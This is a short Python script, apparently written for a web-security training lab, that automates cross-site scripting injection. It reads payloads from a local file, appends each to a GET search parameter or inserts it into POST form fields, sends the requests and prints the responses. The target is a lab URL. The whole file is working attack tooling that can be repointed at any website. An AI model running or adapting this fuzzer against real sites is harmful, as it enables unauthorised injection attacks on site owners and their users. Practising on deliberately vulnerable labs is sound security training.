from typing import List
import requests
import json as js
from copy import copy


class XSSJ:
    def __init__(self, url) -> None:
        self.list_xss = [xss.replace("\n", "") for xss in open("./dic.xss", 'r').readlines()]
        self.list_tag = [tag.replace("\n", "") for tag in open("./tags.xss", 'r').readlines()]
        self.url = url
        self.json = None
        self.response = None
        self.request_method = None
        self.list_responses = []

    def get_list_xss(self) -> List[str]:
        return self.list_xss

    def get_list_tag(self) -> List[str]:
        return self.list_tag

    def get_url(self) -> str:
        return self.url

    def get_json(self) -> str:
        return self.json

    def get_response(self):
        return self.response

    def get_list_responses(self):
        return self.list_responses

    def get_request_method(self):
        return self.request_method

    def inject_url_get(self, url, xss_code) -> str:
        if url:
            return url + xss_code

    def format_json_post(self, json, xss_code):
        for key in json.keys():
            if type(json[key]) == str and "!!!" in json[key]:
                json[key] = json[key].replace("!!!", xss_code)
        return js.loads(js.dumps(json))

    def condition_request(self, xss):
        request_url = copy(self.get_url())
        if self.get_request_method() == "post":
            injection_formatted = self.format_json_post(json=copy(self.get_json()), xss_code=xss)
        elif self.get_request_method() == "get":
            injection_formatted = self.inject_url_get(url=request_url, xss_code=xss)
        else:
            injection_formatted = None
            print("REQUEST METHOD NOT SUPPORTED")
        return injection_formatted

    def request(self, html_tag=None):
        request_url = copy(self.get_url())
        for xss in self.get_list_xss():
            if html_tag:
                if html_tag in self.get_list_tag():
                    if "</" + html_tag + ">" in xss:
                        injection_formatted = self.condition_request(xss=xss)
                        if not injection_formatted:
                            break
                    else:
                        continue
                else:
                    print("HTML TAG NOT VALID")
                    break
            else:
                injection_formatted = self.condition_request(xss=xss)
                if not injection_formatted:
                    break
            if self.get_request_method() == "post":
                self.response = requests.post(request_url, injection_formatted)
            elif self.get_request_method() == "get":
                self.response = requests.get(injection_formatted)
            self.list_responses.append(self.response)
            print(self.response.status_code, injection_formatted)

    def run(self, request_type=None, html_tag=None, json=None):
        self.json = json
        self.request_method = request_type
        if request_type:
            self.request(html_tag=html_tag)
        else:
            print("REQUEST METHOD NOT VALID")

def main():
    json_ = {"csrf": "AKW9tdvDBSt20F26w8ueU03E91aT8W97", "postId": 3, "comment": "!!!", "name": "joker",
             "email": "oi@oi"}
    xssj = XSSJ("https://0abe00b00317220fc01b53e40008004a.web-security-academy.net/?search=")
    xssj.run(request_type="get", html_tag="script", json=json_)


if __name__ == "__main__":
    main()
